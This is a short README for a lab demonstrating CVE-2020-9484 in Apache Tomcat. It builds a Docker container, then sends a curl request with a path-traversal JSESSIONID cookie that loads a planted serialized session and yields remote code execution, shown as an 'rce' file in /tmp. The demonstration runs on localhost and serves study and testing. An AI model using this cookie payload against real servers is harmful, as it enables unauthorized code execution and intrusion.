# CVE-2020-9484 (Tomcat)

For educational purposes only.

See Reference for the details.


## Run
```
$ git clone https://github.com/masahiro331/CVE-2020-9484.git
$ cd CVE-2020-9484
$ docker build -t tomcat:groovy .
$ CONTAINER=`docker run -d -p 8080:8080 tomcat:groovy`
```

## Check (clean)
```
$ docker exec -it $CONTAINER ls -la /tmp
```
**NOTE:** (`rce` NOT in output)

## Exploit
```
$ curl 'http://127.0.0.1:8080/index.jsp' -H 'Cookie: JSESSIONID=../../../../../usr/local/tomcat/groovy'
```

## Check (exploited)
```
$ docker exec -it $CONTAINER ls -la /tmp
```
**NOTE:** (`rce` IS in output)
